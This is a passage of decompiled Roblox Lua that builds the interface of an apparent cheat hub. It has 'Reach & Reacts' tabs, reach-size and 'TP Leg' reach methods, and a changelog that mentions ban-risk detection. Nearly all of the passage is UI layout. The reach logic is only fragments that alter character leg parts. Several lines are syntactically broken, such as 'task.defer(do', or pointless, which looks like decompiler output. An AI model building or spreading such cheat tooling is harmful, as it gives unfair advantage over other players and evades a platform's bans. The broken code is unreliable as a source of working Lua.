Hub_Owner_Suggestions_Helpers.Text = "Hub owner, Suggestions, Helpers";
Hub_Owner_Suggestions_Helpers.TextColor3 = R294_Result_7;
Hub_Owner_Suggestions_Helpers.Font = Enum.Font.GothamBold;
Hub_Owner_Suggestions_Helpers.TextSize = 10;
Hub_Owner_Suggestions_Helpers.TextWrapped = true;
local _ = Enum.TextXAlignment.Left;
Hub_Owner_Suggestions_Helpers.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Top;
Hub_Owner_Suggestions_Helpers.TextYAlignment = Enum.TextYAlignment.Top;
Hub_Owner_Suggestions_Helpers.Parent = Frame_32;
Frame_32:GetPropertyChangedSignal("AbsoluteSize"):Connect(function(a_14, b_14, c_14)
    R1408_X = r1408.X;
    R1408_X_2_Minus_Number_5 = R1408_X - 60;
    Math_Max_Result_3 = math.max(100, R1408_X_2_Minus_Number_5);
    R1340_Result_2 = r1340(Math_Max_Result_3, 1e4);
    TextSize_4 = TextService:GetTextSize(r1412, r1413, r1414, R1340_Result_2);
    R4324_Y = TextSize_4.Y;
    R397_Result_3 = UDim2_New(1, -40, 0, R4324_Y);
    Hub_Owner_Suggestions_Helpers.Size = R397_Result_3;
    R4324_Y_2 = TextSize_4.Y;
    Number_6_Plus_R4324_Y_3 = 28 + R4324_Y_2;
    r4330 = Number_6_Plus_R4324_Y_3 + 10;
    Math_Max_Result_4 = math.max(52, r4330);
    R397_Result_4 = UDim2_New(1, 0, 0, Math_Max_Result_4);
    Frame_32.Size = R397_Result_4;
end);
Hub_Owner_Suggestions_Helpers:GetPropertyChangedSignal("Text"):Connect(function(a_14, b_14, c_14)
    R1408_X = r1408.X;
    R1408_X_2_Minus_Number_5 = R1408_X - 60;
    Math_Max_Result_3 = math.max(100, R1408_X_2_Minus_Number_5);
    R1340_Result_2 = r1340(Math_Max_Result_3, 1e4);
    TextSize_4 = TextService:GetTextSize(r1412, r1413, r1414, R1340_Result_2);
    R4324_Y = TextSize_4.Y;
    R397_Result_3 = UDim2_New(1, -40, 0, R4324_Y);
    Hub_Owner_Suggestions_Helpers.Size = R397_Result_3;
    R4324_Y_2 = TextSize_4.Y;
    Number_6_Plus_R4324_Y_3 = 28 + R4324_Y_2;
    r4330 = Number_6_Plus_R4324_Y_3 + 10;
    Math_Max_Result_4 = math.max(52, r4330);
    R397_Result_4 = UDim2_New(1, 0, 0, Math_Max_Result_4);
    Frame_32.Size = R397_Result_4;
end);

task.defer(do
    r1408 = Frame_32.AbsoluteSize;
    r1412 = Hub_Owner_Suggestions_Helpers.Text;
    r1413 = Hub_Owner_Suggestions_Helpers.TextSize;
    r1414 = Hub_Owner_Suggestions_Helpers.Font;
    local TextSize_6 = TextService:GetTextSize(
        r1412,
        r1413,
        r1414,
        r1340(
        math.max(
            100,
            r1408.X - 60
        ),
        1e4
    )
    );
    Hub_Owner_Suggestions_Helpers.Size = UDim2_New(1, -40, 0, TextSize_6.Y);
    Frame_32.Size = UDim2_New(
        1,
        0,
        0,
        math.max(
            52,
            (
                28 + TextSize_6.Y
            ) + 10
        )
    );
end);
game:GetService("TextService");
local Frame_33 = Instance.new"Frame";
Frame_33.BackgroundColor3 = FromRGB(27, 27, 27);
Frame_33.BorderSizePixel = 0;
Frame_33.LayoutOrder = 1;
Frame_33.Parent = Frame_30;
r1434 = Instance.new("UICorner", Frame_33);
r1434.CornerRadius = UDim_New(0, 8);
local UIStroke_18 = Instance.new"UIStroke";
UIStroke_18.Color = R294_Result_4;
UIStroke_18.Thickness = 1;
UIStroke_18.Parent = Frame_33;
local UIPadding_9 = Instance.new"UIPadding";
UIPadding_9.PaddingTop = UDim_New(0, 10);
UIPadding_9.PaddingBottom = UDim_New(0, 10);
UIPadding_9.PaddingLeft = UDim_New(0, 10);
UIPadding_9.PaddingRight = UDim_New(0, 10);
UIPadding_9.Parent = Frame_33;
local ImageLabel_11 = Instance.new"ImageLabel";
ImageLabel_11.Size = UDim2_New(0, 20, 0, 20);
ImageLabel_11.Position = UDim2_New(0, 0, 0, 0);
ImageLabel_11.BackgroundTransparency = 1;
ImageLabel_11.Image = "rbxassetid://95545489603627";
ImageLabel_11.ImageColor3 = R294_Result_6;
ImageLabel_11.Parent = Frame_33;
local Logs = Instance.new"TextLabel";
Logs.Size = UDim2_New(1, -28, 0, 20);
Logs.Position = UDim2_New(0, 25, 0, 0);
Logs.BackgroundTransparency = 1;
Logs.Text = "Logs";
Logs.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Logs.Font = Enum.Font.GothamBold;
Logs.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Logs.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Logs.TextYAlignment = Enum.TextYAlignment.Center;
Logs.Parent = Frame_33;
local Regex_2 = Instance.new"TextLabel";
Regex_2.Size = UDim2_New(1, -28, 0, 0);
Regex_2.Position = UDim2_New(0, 10, 0, 21);
Regex_2.BackgroundTransparency = 1;
Regex_2.Text = "[ + ] Added New Style UI\n[ ~ ] Improved Reach/Reacts\n[ + ] Added New Tab Design [ Ban Risk detect, support's script, Modules Loaded, Status Script ]\n[ + ] Sigma Update Detected\n[ + ] Tung Tung Sahur Reach Added";
Regex_2.TextColor3 = R294_Result_7;
Regex_2.Font = Enum.Font.GothamBold;
Regex_2.TextSize = 11;
Regex_2.RichText = true;
Regex_2.TextWrapped = true;
local _ = Enum.TextXAlignment.Left;
Regex_2.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Top;
Regex_2.TextYAlignment = Enum.TextYAlignment.Top;
Regex_2.Parent = Frame_33;
Frame_33:GetPropertyChangedSignal("AbsoluteSize"):Connect(function(a_15, b_15, c_15)
    R1480_X = r1480.X;
    R1480_X_2_Minus_Number_9 = R1480_X - 48;
    Math_Max_Result_5 = math.max(100, R1480_X_2_Minus_Number_9);
    R1340_Result_3 = r1340(Math_Max_Result_5, 1e4);
    TextSize_7 = TextService:GetTextSize(r1484, r1485, r1486, R1340_Result_3);
    R4340_Y = TextSize_7.Y;
    R397_Result_5 = UDim2_New(1, -28, 0, R4340_Y);
    Regex_2.Size = R397_Result_5;
    R4340_Y_2 = TextSize_7.Y;
    Number_10_Plus_R4340_Y_3 = 34 + R4340_Y_2;
    r4347 = Number_10_Plus_R4340_Y_3 + 10;
    R397_Result_6 = UDim2_New(1, 0, 0, r4347);
    Frame_33.Size = R397_Result_6;
end);
Regex_2:GetPropertyChangedSignal("Text"):Connect(function(a_15, b_15, c_15)
    R1480_X = r1480.X;
    R1480_X_2_Minus_Number_9 = R1480_X - 48;
    Math_Max_Result_5 = math.max(100, R1480_X_2_Minus_Number_9);
    R1340_Result_3 = r1340(Math_Max_Result_5, 1e4);
    TextSize_7 = TextService:GetTextSize(r1484, r1485, r1486, R1340_Result_3);
    R4340_Y = TextSize_7.Y;
    R397_Result_5 = UDim2_New(1, -28, 0, R4340_Y);
    Regex_2.Size = R397_Result_5;
    R4340_Y_2 = TextSize_7.Y;
    Number_10_Plus_R4340_Y_3 = 34 + R4340_Y_2;
    r4347 = Number_10_Plus_R4340_Y_3 + 10;
    R397_Result_6 = UDim2_New(1, 0, 0, r4347);
    Frame_33.Size = R397_Result_6;
end);

task.defer(do
    r1480 = Frame_33.AbsoluteSize;
    r1484 = Regex_2.Text;
    r1485 = Regex_2.TextSize;
    r1486 = Regex_2.Font;
    local TextSize_9 = TextService:GetTextSize(
        r1484,
        r1485,
        r1486,
        r1340(
        math.max(
            100,
            r1480.X - 48
        ),
        1e4
    )
    );
    Regex_2.Size = UDim2_New(1, -28, 0, TextSize_9.Y);
    Frame_33.Size = UDim2_New(
        1,
        0,
        0,
        (
            34 + TextSize_9.Y
        ) + 10
    );
end);
local Frame_34 = Instance.new"Frame";
Frame_34.Size = UDim2_New(1, 0, 0, 30);
Frame_34.BackgroundColor3 = R294_Result_3;
Frame_34.BorderSizePixel = 0;
ScrollingFrame_7:GetChildren();
Frame_34.LayoutOrder = 0;
Frame_34.Parent = ScrollingFrame_7;
r1505 = Instance.new("UICorner", Frame_34);
r1505.CornerRadius = UDim_New(0, 6);
local UIStroke_19 = Instance.new"UIStroke";
UIStroke_19.Color = R294_Result_4;
UIStroke_19.Parent = Frame_34;
local Logs_UI_Library = Instance.new"TextLabel";
Logs_UI_Library.Size = UDim2_New(1, -16, 0, 26);
Logs_UI_Library.Position = UDim2_New(0, 8, 0, 2);
Logs_UI_Library.BackgroundTransparency = 1;
Logs_UI_Library.Text = "Logs UI-Library";
Logs_UI_Library.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Logs_UI_Library.Font = Enum.Font.GothamBold;
Logs_UI_Library.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Logs_UI_Library.TextXAlignment = Enum.TextXAlignment.Left;
Logs_UI_Library.Parent = Frame_34;
local Frame_35 = Instance.new"Frame";
Frame_35.Size = UDim2_New(1, 0, 1, -28);
Frame_35.Position = UDim2_New(0, 0, 0, 28);
Frame_35.BackgroundTransparency = 1;
Frame_35.Parent = Frame_34;
local UIListLayout_14 = Instance.new"UIListLayout";
UIListLayout_14.Padding = UDim_New(0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_14.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_14.Parent = Frame_35;
local UIPadding_10 = Instance.new"UIPadding";
UIPadding_10.PaddingLeft = UDim_New(0, 8);
UIPadding_10.PaddingRight = UDim_New(0, 8);
UIPadding_10.PaddingBottom = UDim_New(0, 8);
UIPadding_10.Parent = Frame_35;
UIListLayout_14:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function(a_43, b_43, c_43)
    Frame_34.Size = UDim2_New(
        1,
        0,
        0,
        UIListLayout_14.AbsoluteContentSize.Y + 36
    );
end);
game:GetService("TextService");
local Frame_36 = Instance.new"Frame";
Frame_36.BackgroundColor3 = FromRGB(27, 27, 27);
Frame_36.BorderSizePixel = 0;
Frame_36.LayoutOrder = 1;
Frame_36.Parent = Frame_35;
r1544 = Instance.new("UICorner", Frame_36);
r1544.CornerRadius = UDim_New(0, 8);
local UIStroke_20 = Instance.new"UIStroke";
UIStroke_20.Color = R294_Result_4;
UIStroke_20.Thickness = 1;
UIStroke_20.Parent = Frame_36;
local UIPadding_11 = Instance.new"UIPadding";
UIPadding_11.PaddingTop = UDim_New(0, 10);
UIPadding_11.PaddingBottom = UDim_New(0, 10);
UIPadding_11.PaddingLeft = UDim_New(0, 10);
UIPadding_11.PaddingRight = UDim_New(0, 10);
UIPadding_11.Parent = Frame_36;
local ImageLabel_12 = Instance.new"ImageLabel";
ImageLabel_12.Size = UDim2_New(0, 20, 0, 20);
ImageLabel_12.Position = UDim2_New(0, 0, 0, 0);
ImageLabel_12.BackgroundTransparency = 1;
ImageLabel_12.Image = "rbxassetid://106412780353220";
ImageLabel_12.ImageColor3 = R294_Result_6;
ImageLabel_12.Parent = Frame_36;
local Logs_2 = Instance.new"TextLabel";
Logs_2.Size = UDim2_New(1, -28, 0, 20);
Logs_2.Position = UDim2_New(0, 25, 0, 0);
Logs_2.BackgroundTransparency = 1;
Logs_2.Text = "Logs";
Logs_2.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Logs_2.Font = Enum.Font.GothamBold;
Logs_2.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Logs_2.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Logs_2.TextYAlignment = Enum.TextYAlignment.Center;
Logs_2.Parent = Frame_36;
local Regex_3 = Instance.new"TextLabel";
Regex_3.Size = UDim2_New(1, -28, 0, 0);
Regex_3.Position = UDim2_New(0, 10, 0, 21);
Regex_3.BackgroundTransparency = 1;
Regex_3.Text = "[ + ] Reworked UI Library\n[ + ] Removed ScrollingFrame Color [ Transparent Now]\n[ + ] Reworked Game Stats\n[ + ]  Added Detect [ Ban, Support, Risk, Modules ]";
Regex_3.TextColor3 = R294_Result_7;
Regex_3.Font = Enum.Font.GothamBold;
Regex_3.TextSize = 11;
Regex_3.RichText = true;
Regex_3.TextWrapped = true;
local _ = Enum.TextXAlignment.Left;
Regex_3.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Top;
Regex_3.TextYAlignment = Enum.TextYAlignment.Top;
Regex_3.Parent = Frame_36;
Frame_36:GetPropertyChangedSignal("AbsoluteSize"):Connect(function(a_16, b_16, c_16)
    R1590_X = r1590.X;
    R1590_X_2_Minus_Number_13 = R1590_X - 48;
    Math_Max_Result_6 = math.max(100, R1590_X_2_Minus_Number_13);
    R1340_Result_4 = r1340(Math_Max_Result_6, 1e4);
    TextSize_10 = TextService:GetTextSize(r1594, r1595, r1596, R1340_Result_4);
    R4360_Y = TextSize_10.Y;
    R397_Result_7 = UDim2_New(1, -28, 0, R4360_Y);
    Regex_3.Size = R397_Result_7;
    R4360_Y_2 = TextSize_10.Y;
    Number_14_Plus_R4360_Y_3 = 34 + R4360_Y_2;
    r4367 = Number_14_Plus_R4360_Y_3 + 10;
    R397_Result_8 = UDim2_New(1, 0, 0, r4367);
    Frame_36.Size = R397_Result_8;
end);
Regex_3:GetPropertyChangedSignal("Text"):Connect(function(a_16, b_16, c_16)
    R1590_X = r1590.X;
    R1590_X_2_Minus_Number_13 = R1590_X - 48;
    Math_Max_Result_6 = math.max(100, R1590_X_2_Minus_Number_13);
    R1340_Result_4 = r1340(Math_Max_Result_6, 1e4);
    TextSize_10 = TextService:GetTextSize(r1594, r1595, r1596, R1340_Result_4);
    R4360_Y = TextSize_10.Y;
    R397_Result_7 = UDim2_New(1, -28, 0, R4360_Y);
    Regex_3.Size = R397_Result_7;
    R4360_Y_2 = TextSize_10.Y;
    Number_14_Plus_R4360_Y_3 = 34 + R4360_Y_2;
    r4367 = Number_14_Plus_R4360_Y_3 + 10;
    R397_Result_8 = UDim2_New(1, 0, 0, r4367);
    Frame_36.Size = R397_Result_8;
end);

task.defer(do
    r1590 = Frame_36.AbsoluteSize;
    r1594 = Regex_3.Text;
    r1595 = Regex_3.TextSize;
    r1596 = Regex_3.Font;
    local TextSize_12 = TextService:GetTextSize(
        r1594,
        r1595,
        r1596,
        r1340(
        math.max(
            100,
            r1590.X - 48
        ),
        1e4
    )
    );
    Regex_3.Size = UDim2_New(1, -28, 0, TextSize_12.Y);
    Frame_36.Size = UDim2_New(
        1,
        0,
        0,
        (
            34 + TextSize_12.Y
        ) + 10
    );
end);
local TextButton_7 = Instance.new"TextButton";
TextButton_7.Size = UDim2_New(1, 0, 0, 40);
TextButton_7.BackgroundTransparency = 1;
TextButton_7.Text = "";
TextButton_7.AutoButtonColor = false;
TextButton_7.Parent = ScrollingFrame;
local Frame_37 = Instance.new"Frame";
Frame_37.Size = UDim2_New(0, 3, 0, 22);
Frame_37.Position = UDim2_New(0, 0, 0.5, -11);
Frame_37.BackgroundColor3 = R294_Result_5;
Frame_37.BackgroundTransparency = 1;
Frame_37.Parent = TextButton_7;
r1618 = Instance.new("UICorner", Frame_37);
r1618.CornerRadius = UDim_New(1, 0);
local Reach_And_Reacts = Instance.new"TextLabel";
Reach_And_Reacts.Size = UDim2_New(1, -12, 0, 18);
Reach_And_Reacts.Position = UDim2_New(0, 12, 0, 4);
Reach_And_Reacts.BackgroundTransparency = 1;
Reach_And_Reacts.Text = "Reach & Reacts";
Reach_And_Reacts.TextColor3 = R294_Result_7;
local _ = Enum.Font.GothamBold;
Reach_And_Reacts.Font = Enum.Font.GothamBold;
Reach_And_Reacts.TextSize = 11;
local _ = Enum.TextXAlignment.Left;
Reach_And_Reacts.TextXAlignment = Enum.TextXAlignment.Left;
Reach_And_Reacts.Parent = TextButton_7;
local Reach_And_Reacts_2 = Instance.new"TextLabel";
Reach_And_Reacts_2.Size = UDim2_New(1, -12, 0, 14);
Reach_And_Reacts_2.Position = UDim2_New(0, 12, 0, 21);
Reach_And_Reacts_2.BackgroundTransparency = 1;
Reach_And_Reacts_2.Text = "Reach, And Reacts...";
Reach_And_Reacts_2.TextColor3 = R294_Result_7;
local _ = Enum.Font.Gotham;
Reach_And_Reacts_2.Font = Enum.Font.Gotham;
Reach_And_Reacts_2.TextSize = 11;
local _ = Enum.TextXAlignment.Left;
Reach_And_Reacts_2.TextXAlignment = Enum.TextXAlignment.Left;
Reach_And_Reacts_2.Parent = TextButton_7;
local Frame_38 = Instance.new"Frame";
Frame_38.Size = UDim2_New(1, 0, 1, 0);
Frame_38.BackgroundTransparency = 1;
Frame_38.Visible = false;
Frame_38.Parent = Frame_3;
local ScrollingFrame_9 = Instance.new"ScrollingFrame";
ScrollingFrame_9.Size = UDim2_New(0.5, -8, 1, -10);
ScrollingFrame_9.Position = UDim2_New(0, 6, 0, 5);
ScrollingFrame_9.BackgroundTransparency = 1;
ScrollingFrame_9.ScrollBarThickness = 1;
ScrollingFrame_9.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_9.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_9.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_9.Parent = Frame_38;
local UIListLayout_15 = Instance.new"UIListLayout";
UIListLayout_15.Padding = UDim_New(0, 8);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_15.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_15.Parent = ScrollingFrame_9;
local ScrollingFrame_10 = Instance.new"ScrollingFrame";
ScrollingFrame_10.Size = UDim2_New(0.5, -8, 1, -10);
ScrollingFrame_10.Position = UDim2_New(0.5, 2, 0, 5);
ScrollingFrame_10.BackgroundTransparency = 1;
ScrollingFrame_10.ScrollBarThickness = 1;
ScrollingFrame_10.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_10.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_10.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_10.Parent = Frame_38;
local UIListLayout_16 = Instance.new"UIListLayout";
UIListLayout_16.Padding = UDim_New(0, 8);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_16.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_16.Parent = ScrollingFrame_10;
TextButton_7.MouseButton1Click:Connect(function(a_45, b_45, c_45)
    local _ = TextButton_6 == TextButton_7;
    TweenService:Create(Frame_25, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(Update_Logs, r1036(0.2), {
        ["TextColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    Frame_26.Visible = false;
    TweenService:Create(Frame_37, r1036(0.2), {
        ["BackgroundTransparency"] = 0
    }):Play();
    r1040:Play();
    TweenService:Create(Reach_And_Reacts, r1036(0.2), {
        ["TextColor3"] = R294_Result_6
    }):Play();
    r1040:Play();
    Frame_38.Visible = true;
end);
local Frame_39 = Instance.new"Frame";
Frame_39.Size = UDim2_New(1, 0, 0, 30);
Frame_39.BackgroundColor3 = R294_Result_3;
Frame_39.BorderSizePixel = 0;
ScrollingFrame_9:GetChildren();
Frame_39.LayoutOrder = 0;
Frame_39.Parent = ScrollingFrame_9;
r1678 = Instance.new("UICorner", Frame_39);
r1678.CornerRadius = UDim_New(0, 6);
local UIStroke_21 = Instance.new"UIStroke";
UIStroke_21.Color = R294_Result_4;
UIStroke_21.Parent = Frame_39;
local Reach = Instance.new"TextLabel";
Reach.Size = UDim2_New(1, -16, 0, 26);
Reach.Position = UDim2_New(0, 8, 0, 2);
Reach.BackgroundTransparency = 1;
Reach.Text = "Reach";
Reach.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Reach.Font = Enum.Font.GothamBold;
Reach.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Reach.TextXAlignment = Enum.TextXAlignment.Left;
Reach.Parent = Frame_39;
local Frame_40 = Instance.new"Frame";
Frame_40.Size = UDim2_New(1, 0, 1, -28);
Frame_40.Position = UDim2_New(0, 0, 0, 28);
Frame_40.BackgroundTransparency = 1;
Frame_40.Parent = Frame_39;
local UIListLayout_17 = Instance.new"UIListLayout";
UIListLayout_17.Padding = UDim_New(0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_17.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_17.Parent = Frame_40;
local UIPadding_12 = Instance.new"UIPadding";
UIPadding_12.PaddingLeft = UDim_New(0, 8);
UIPadding_12.PaddingRight = UDim_New(0, 8);
UIPadding_12.PaddingBottom = UDim_New(0, 8);
UIPadding_12.Parent = Frame_40;
UIListLayout_17:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function(a_46, b_46, c_46)
    Frame_39.Size = UDim2_New(
        1,
        0,
        0,
        UIListLayout_17.AbsoluteContentSize.Y + 36
    );
end);
local Frame_41 = Instance.new"Frame";
Frame_41.Size = UDim2_New(1, 0, 0, 30);
Frame_41.BackgroundColor3 = R294_Result_3;
Frame_41.BorderSizePixel = 0;
ScrollingFrame_10:GetChildren();
Frame_41.LayoutOrder = 0;
Frame_41.Parent = ScrollingFrame_10;
r1717 = Instance.new("UICorner", Frame_41);
r1717.CornerRadius = UDim_New(0, 6);
local UIStroke_22 = Instance.new"UIStroke";
UIStroke_22.Color = R294_Result_4;
UIStroke_22.Parent = Frame_41;
local Reacts = Instance.new"TextLabel";
Reacts.Size = UDim2_New(1, -16, 0, 26);
Reacts.Position = UDim2_New(0, 8, 0, 2);
Reacts.BackgroundTransparency = 1;
Reacts.Text = "Reacts";
Reacts.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Reacts.Font = Enum.Font.GothamBold;
Reacts.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Reacts.TextXAlignment = Enum.TextXAlignment.Left;
Reacts.Parent = Frame_41;
local Frame_42 = Instance.new"Frame";
Frame_42.Size = UDim2_New(1, 0, 1, -28);
Frame_42.Position = UDim2_New(0, 0, 0, 28);
Frame_42.BackgroundTransparency = 1;
Frame_42.Parent = Frame_41;
local UIListLayout_18 = Instance.new"UIListLayout";
UIListLayout_18.Padding = UDim_New(0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_18.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_18.Parent = Frame_42;
local UIPadding_13 = Instance.new"UIPadding";
UIPadding_13.PaddingLeft = UDim_New(0, 8);
UIPadding_13.PaddingRight = UDim_New(0, 8);
UIPadding_13.PaddingBottom = UDim_New(0, 8);
UIPadding_13.Parent = Frame_42;
UIListLayout_18:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function(a_47, b_47, c_47)
    Frame_41.Size = UDim2_New(
        1,
        0,
        0,
        UIListLayout_18.AbsoluteContentSize.Y + 36
    );
end);
game:GetService("Players");
CharacterAdded:Connect(function(character, a_48, b_48, c_48)
    task.wait(1.2);
end);
local Frame_43 = Instance.new"Frame";
Frame_43.BackgroundTransparency = 1;
Frame_43.LayoutOrder = 1;
Frame_43.Parent = Frame_40;
local Reach_Size_Method = Instance.new"TextLabel";
Reach_Size_Method.Size = UDim2_New(1, 0, 0, 16);
Reach_Size_Method.Position = UDim2_New(0, 0, 0, 0);
Reach_Size_Method.BackgroundTransparency = 1;
Reach_Size_Method.Text = "Reach Size Method";
Reach_Size_Method.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Reach_Size_Method.Font = Enum.Font.GothamBold;
Reach_Size_Method.TextSize = 12;
Reach_Size_Method.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Reach_Size_Method.TextXAlignment = Enum.TextXAlignment.Left;
Reach_Size_Method.Parent = Frame_43;
local Auto_Return_When_You_Die = Instance.new"TextLabel";
Auto_Return_When_You_Die.Size = UDim2_New(1, 0, 0, 0);
Auto_Return_When_You_Die.Position = UDim2_New(0, 0, 0, 18);
Auto_Return_When_You_Die.BackgroundTransparency = 1;
Auto_Return_When_You_Die.Text = "Auto Return When You Die";
Auto_Return_When_You_Die.TextColor3 = R294_Result_7;
local _ = Enum.Font.Gotham;
Auto_Return_When_You_Die.Font = Enum.Font.Gotham;
Auto_Return_When_You_Die.TextSize = 10;
Auto_Return_When_You_Die.TextWrapped = true;
local _ = Enum.TextXAlignment.Left;
Auto_Return_When_You_Die.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Top;
Auto_Return_When_You_Die.TextYAlignment = Enum.TextYAlignment.Top;
Auto_Return_When_You_Die.Parent = Frame_43;
game:GetService("TextService");
local _ = Enum.Font.Gotham;
local AbsoluteSize_9 = Frame_40.AbsoluteSize;
local Auto_Return_When_You_Die_2 = TextService:GetTextSize(
    "Auto Return When You Die",
    9,
    Enum.Font.Gotham,
    r1340(
    AbsoluteSize_9.X - 16,
    1e3
)
);
Auto_Return_When_You_Die.Size = UDim2_New(1, 0, 0, Auto_Return_When_You_Die_2.Y);
local r1794 = (
    16 + Auto_Return_When_You_Die_2.Y
) + 6;
local Frame_44 = Instance.new"Frame";
Frame_44.Size = UDim2_New(1, 0, 0, 28);
Frame_44.Position = UDim2_New(0, 0, 0, r1794);
Frame_44.BackgroundColor3 = FromRGB(22, 22, 26);
Frame_44.BorderSizePixel = 0;
Frame_44.Parent = Frame_43;
r1802 = Instance.new("UICorner", Frame_44);
r1802.CornerRadius = UDim_New(0, 5);
local UIStroke_23 = Instance.new"UIStroke";
UIStroke_23.Color = R294_Result_4;
UIStroke_23.Thickness = 1;
UIStroke_23.Parent = Frame_44;
local TextBox_2 = Instance.new"TextBox";
TextBox_2.Size = UDim2_New(1, -16, 1, 0);
TextBox_2.Position = UDim2_New(0, 8, 0, 0);
TextBox_2.BackgroundTransparency = 1;
TextBox_2.PlaceholderText = "0";
TextBox_2.PlaceholderColor3 = R294_Result_7;
TextBox_2.Text = "";
TextBox_2.TextColor3 = R294_Result_6;
local _ = Enum.Font.Gotham;
TextBox_2.Font = Enum.Font.Gotham;
TextBox_2.TextSize = 10;
TextBox_2.ClearTextOnFocus = false;
local _ = Enum.TextXAlignment.Left;
TextBox_2.TextXAlignment = Enum.TextXAlignment.Left;
TextBox_2.Parent = Frame_44;
Frame_43.Size = UDim2_New(
    1,
    0,
    0,
    r1794 + 32
);
TextBox_2.Focused:Connect(function(a_49, b_49, c_49)
    TweenService:Create(UIStroke_23, r1036(0.2), {
        ["Color"] = R294_Result_5
    }):Play();
    r1040:Play();
end);
TextBox_2.FocusLost:Connect(function(enterPressed, a_50, b_50, c_50)
    TweenService:Create(UIStroke_23, r1036(0.2), {
        ["Color"] = R294_Result_4
    }):Play();
    r1040:Play();
    pcall(function(p1_52, a_52, b_52, c_52)
        pcall(function(a_51, b_51, c_51)
            tonumber(TextBox_2.Text);
        end);
    end);
end);
game:GetService("Players");
CharacterAdded:Connect(function(character_1, a_53, b_53, c_53)
    for for_key_10, for_val_10 in ipairs(Character:FindFirstChild("Torso"):GetChildren()) do
    end;
    Character:FindFirstChild("Left Leg");
    Character:FindFirstChild("Right Leg").Transparency = 0;
end);
local Frame_45 = Instance.new"Frame";
Frame_45.BackgroundTransparency = 1;
Frame_45.LayoutOrder = 2;
Frame_45.Parent = Frame_40;
local TP_Leg_Reach_Method = Instance.new"TextLabel";
TP_Leg_Reach_Method.Size = UDim2_New(1, 0, 0, 16);
TP_Leg_Reach_Method.Position = UDim2_New(0, 0, 0, 0);
TP_Leg_Reach_Method.BackgroundTransparency = 1;
TP_Leg_Reach_Method.Text = "TP Leg Reach Method";
TP_Leg_Reach_Method.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
TP_Leg_Reach_Method.Font = Enum.Font.GothamBold;
TP_Leg_Reach_Method.TextSize = 12;
TP_Leg_Reach_Method.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
TP_Leg_Reach_Method.TextXAlignment = Enum.TextXAlignment.Left;
TP_Leg_Reach_Method.Parent = Frame_45;
local Auto_Return_When_You_Die_3 = Instance.new"TextLabel";
Auto_Return_When_You_Die_3.Size = UDim2_New(1, 0, 0, 0);
Auto_Return_When_You_Die_3.Position = UDim2_New(0, 0, 0, 18);
Auto_Return_When_You_Die_3.BackgroundTransparency = 1;
Auto_Return_When_You_Die_3.Text = "Auto Return When You Die";
Auto_Return_When_You_Die_3.TextColor3 = R294_Result_7;
local _ = Enum.Font.Gotham;
Auto_Return_When_You_Die_3.Font = Enum.Font.Gotham;
Auto_Return_When_You_Die_3.TextSize = 10;
Auto_Return_When_You_Die_3.TextWrapped = true;
local _ = Enum.TextXAlignment.Left;
Auto_Return_When_You_Die_3.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Top;
Auto_Return_When_You_Die_3.TextYAlignment = Enum.TextYAlignment.Top;
Auto_Return_When_You_Die_3.Parent = Frame_45;
game:GetService("TextService");
local _ = Enum.Font.Gotham;
local Auto_Return_When_You_Die_4 = TextService:GetTextSize(
    "Auto Return When You Die",
    9,
    Enum.Font.Gotham,
    r1340(
    AbsoluteSize_9.X - 16,
    1e3
)
);
Auto_Return_When_You_Die_3.Size = UDim2_New(1, 0, 0, Auto_Return_When_You_Die_4.Y);
local r1866 = (
    16 + Auto_Return_When_You_Die_4.Y
) + 6;
local Frame_46 = Instance.new"Frame";
Frame_46.Size = UDim2_New(1, 0, 0, 28);
Frame_46.Position = UDim2_New(0, 0, 0, r1866);
Frame_46.BackgroundColor3 = FromRGB(22, 22, 26);
Frame_46.BorderSizePixel = 0;
Frame_46.Parent = Frame_45;
r1874 = Instance.new("UICorner", Frame_46);
r1874.CornerRadius = UDim_New(0, 5);
local UIStroke_24 = Instance.new"UIStroke";
UIStroke_24.Color = R294_Result_4;
